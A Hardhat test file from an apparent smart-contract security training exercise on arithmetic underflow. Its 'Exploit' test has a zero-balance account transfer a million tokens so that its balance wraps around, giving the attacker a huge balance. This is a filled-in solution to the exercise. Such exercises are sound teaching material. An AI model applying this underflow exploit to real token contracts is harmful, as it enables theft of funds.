const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Arithmetic Over/Underflow Exercise 2', function () {

    let deployer, attacker;
    const ATTACKER1_MINT = ethers.utils.parseEther("10");
    const DEPLOYER_MINT = ethers.utils.parseEther("100000");

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, attacker] = await ethers.getSigners();

        // Deploy
        const tokenFactory = await ethers.getContractFactory(
            'contracts/arithmetic-overflows-2/SimpleToken.sol:SimpleToken',
            deployer
        );
        // const tokenFactory = await ethers.getContractFactory(
        //     'contracts/arithmetic-overflows-2/solution/SimpleTokenSecured.sol:SimpleTokenSecured',
        //     deployer
        // );
        this.token = await tokenFactory.deploy();

        await this.token.mint(deployer.address, DEPLOYER_MINT);
        await this.token.mint(attacker.address, ATTACKER1_MINT); 
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Get a new signer (account with 0 tokens)
        let newAccount = await ethers.getSigner(2);
        await this.token.connect(newAccount).transfer(attacker.address, ethers.utils.parseEther("1000000"))

        // newaccount - MaxUINT 124895732985437584375285732623874642
        // attacker - 1,000,010
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Attacker should have a lot of tokens (at least more than 1 million)
        expect(await this.token.getBalance(attacker.address)).to.be.gt(
            ethers.utils.parseEther("1000000"));
    });
});
